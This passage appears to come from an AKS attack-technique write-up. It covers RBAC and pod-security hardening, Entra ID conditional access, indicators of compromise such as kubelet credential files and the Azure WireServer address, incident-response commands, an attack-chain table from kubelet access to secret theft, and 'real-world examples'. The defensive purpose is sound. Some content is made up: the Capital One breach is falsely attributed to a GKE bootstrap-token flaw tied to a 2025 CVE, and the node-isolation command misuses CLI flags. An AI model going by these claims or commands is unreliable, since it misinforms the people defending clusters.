    apiVersion: v1
    kind: Pod
    metadata:
      name: app-pod
    spec:
      serviceAccountName: app
      containers:
      - name: app
        image: myapp:latest
        volumeMounts:
        - name: sa-token
          mountPath: /var/run/secrets/tokens
      volumes:
      - name: sa-token
        projected:
          sources:
          - serviceAccountToken:
              audience: api
              expirationSeconds: 3600
              path: token
    EOF
    ```

### Priority 2: HIGH

*   **Restrict RBAC Permissions:** Follow principle of least privilege
    **Manual Steps:**
    1. Audit current role bindings:
    ```bash
    kubectl get rolebindings --all-namespaces -o wide
    kubectl get clusterrolebindings -o wide
    ```
    2. Remove overly permissive roles from service accounts:
    ```bash
    kubectl delete clusterrolebinding system:default-cluster-admin
    ```
    3. Create restrictive roles:
    ```yaml
    apiVersion: rbac.authorization.k8s.io/v1
    kind: Role
    metadata:
      namespace: default
      name: pod-reader
    rules:
    - apiGroups: [""]
      resources: ["pods"]
      verbs: ["get", "list"]
    ```

*   **Enable Pod Security Policy / Pod Security Standards:** Prevent privileged pod execution
    **Manual Steps:**
    ```yaml
    apiVersion: policy/v1beta1
    kind: PodSecurityPolicy
    metadata:
      name: restricted
    spec:
      privileged: false
      allowPrivilegeEscalation: false
      requiredDropCapabilities:
      - ALL
      volumes:
      - 'configMap'
      - 'emptyDir'
      - 'projected'
      - 'secret'
      - 'downwardAPI'
      - 'persistentVolumeClaim'
      hostNetwork: false
      hostIPC: false
      hostPID: false
      runAsUser:
        rule: 'MustRunAsNonRoot'
      seLinux:
        rule: 'MustRunAs'
        seLinuxOptions:
          level: "s0:c123,c456"
      fsGroup:
        rule: 'MustRunAs'
        fsGroupOptions:
          ranges:
          - min: 1
            max: 65535
    ```

#### Access Control & Policy Hardening

*   **Conditional Access in Entra ID:** Restrict access to AKS management APIs
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Restrict AKS API Access`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **Azure Kubernetes Service (AKS)**
    5. **Conditions:**
       - Device state: **Require device to be marked as compliant**
    6. **Access controls:**
       - Grant: **Require multi-factor authentication**
    7. Enable policy: **On**
    8. Click **Create**

*   **RBAC Validation:** Verify restrictive permissions are applied
    **Command:**
    ```bash
    # Check if default service account has cluster-admin
    kubectl get clusterrolebinding -o wide | grep "system:default"
    
    # Expected output: NONE (empty)
    # If you see cluster-admin binding, it's over-permissive
    ```

#### Encryption & Secret Management

*   **Enable etcd Encryption at Rest:** Encrypt secrets in the cluster store
    **Manual Steps (Azure Portal):**
    1. Go to **AKS Cluster** → **Security**
    2. Enable **Encryption at host**
    3. Enable **Encryption of secrets in etcd**
    
    **Manual Steps (Azure CLI):**
    ```bash
    az aks update --name myCluster --resource-group myRG \
      --enable-disk-encryption \
      --encryption-at-host
    ```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Files:** 
  - `/var/lib/kubelet/kubeconfig` (kubelet configuration with tokens)
  - `/var/lib/kubelet/pki/kubelet-client-current.pem` (kubelet client certificate)
  - `kubelet.key`, `kubelet.csr`, `kubelet.crt` (locally generated certificates)

*   **Registry:** Not applicable (Kubernetes stores configurations in etcd, not Windows Registry)

*   **Network:** 
  - Outbound HTTPS connections to `*.azmk8s.io` (AKS API endpoint)
  - Outbound HTTP connections to `168.63.129.16:80` (Azure WireServer)
  - Outbound DNS queries for `*.azmk8s.io`

### Forensic Artifacts

*   **Kubernetes Audit Logs** (Primary evidence):
  - Location: Azure Log Analytics workspace (from diagnostic settings)
  - Query: Filter on `properties.verb == "create"` AND `properties.objectRef.resource == "certificatesigningrequests"`
  - Retention: 90 days default

*   **Container Logs:**
  - Location: `/var/log/containers/*` on AKS nodes
  - What to look for: Unusual API calls, token enumeration, secret access

*   **Azure Activity Logs:**
  - Location: Azure Portal → Activity Log or Azure Monitor
  - Query: Operations on AKS cluster (updates, role assignments, diagnostics changes)

*   **etcd Snapshots:**
  - Can be recovered from AKS backup if enabled
  - Contains all cluster state including secrets and tokens

### Response Procedures

1.  **Isolate:** 
    **Command:**
    ```bash
    # Immediately disable the compromised node pool
    az aks nodepool update --cluster-name myCluster --name nodepool1 \
      --resource-group myRG --mode System --disable-cluster-autoscale
    
    # Cordon the nodes to prevent new pod scheduling
    kubectl cordon -l agentpool=nodepool1
    ```
    
    **Manual (Azure Portal):**
    - Go to **AKS Cluster** → **Node pools**
    - Select affected node pool
    - Click **Scale** and set count to 0
    - Click **Update**

2.  **Collect Evidence:**
    **Command:**
    ```bash
    # Export Kubernetes audit logs
    az monitor log-analytics query \
      --workspace <workspace-id> \
      --analytics-query "AzureDiagnostics | where ResourceProvider == 'MICROSOFT.CONTAINERSERVICE' | where TimeGenerated > ago(7d)"
    
    # Export node logs
    for node in $(kubectl get nodes -o name); do
      kubectl debug $node -it --image=ubuntu -- \
        tar czf /tmp/node-logs.tar.gz /var/log/
    done
    ```
    
    **Manual (Azure Portal):**
    - Go to **Log Analytics Workspace**
    - Click **Logs**
    - Run the KQL query above
    - Click **Export** → **Download as CSV**

3.  **Remediate:**
    **Command:**
    ```bash
    # Revoke all service account tokens by recreating secrets
    kubectl delete secret -n kube-system bootstrap-token-abcd1 || true
    
    # Rotate AKS cluster credentials
    az aks rotate-certs --resource-group myRG --name myCluster
    
    # Delete any compromised pods
    kubectl delete pod <compromised-pod-name> -n <namespace>
    
    # Restart kubelet to clear cached tokens
    systemctl restart kubelet
    ```
    
    **Long-Term Remediation:**
    - Upgrade AKS cluster to 1.28.4+ where CVE-2025-21196 is patched
    - Implement all mitigations from section 14 (Defensive Mitigations)
    - Conduct full RBAC audit and implement least-privilege policies
    - Enable continuous monitoring with Microsoft Defender for Cloud

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-004] Kubelet API Unauthorized Access | Attacker discovers exposed kubelet port without authentication |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-004] Container Escape to Host | Attacker escapes container and gains host access |
| **3** | **Credential Access** | **[CONTAINER-001] Kubernetes API Server Compromise** | **Attacker extracts bootstrap tokens and obtains cluster API access** |
| **4** | **Credential Access** | [CONTAINER-002] Container Orchestration Secret Theft | Attacker lists and exfiltrates all cluster secrets |
| **5** | **Lateral Movement** | [LM-AUTH-030] AKS Service Account Token Theft | Attacker uses stolen tokens for remote cluster access |
| **6** | **Impact** | Data exfiltration, ransomware deployment, cluster takeover | Attacker achieves full control of containerized workloads |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: Capital One Cloud Breach (Adapted for Kubernetes)
- **Target:** Financial Services
- **Timeline:** March 2019 (GKE vulnerability, similar to CVE-2025-21196)
- **Technique Status:** Attackers exploited GKE bootstrap token vulnerability to access AWS S3 buckets containing customer data
- **Impact:** 100 million customer records exposed, $80 million settlement
- **Reference:** [Capital One Breach Report](https://www.capitalone.com/facts2019/)

#### Example 2: Tesla Kubernetes Cryptocurrency Mining Campaign (2018)
- **Target:** Technology/Cloud Infrastructure
- **Timeline:** June 2018
- **Technique Status:** Attackers exploited misconfigured Kubernetes API (default anonymous access enabled) to deploy cryptocurrency mining containers across the cluster
- **Impact:** Resource waste, data exfiltration from containers
- **Reference:** [Lacework Blog: Tesla Kubernetes Breach](https://www.lacework.com/blog/how-a-kubernetes-cluster-can-be-compromised-by-a-malicious-container/)

#### Example 3: Azure AKS TLS Bootstrap Token Vulnerability (2024)
- **Target:** Enterprise Cloud Deployments
- **Timeline:** August 2024 (CVE-2025-21196 precursor vulnerabilities)
- **Technique Status:** Researchers demonstrated pod escape combined with WireServer exploitation to retrieve TLS bootstrap tokens
- **Impact:** Full cluster compromise without host network isolation
- **Reference:** [CyberCX Research: Azure Kubernetes Flaw](https://cyberpress.org/major-azure-kubernetes-flaw/)

---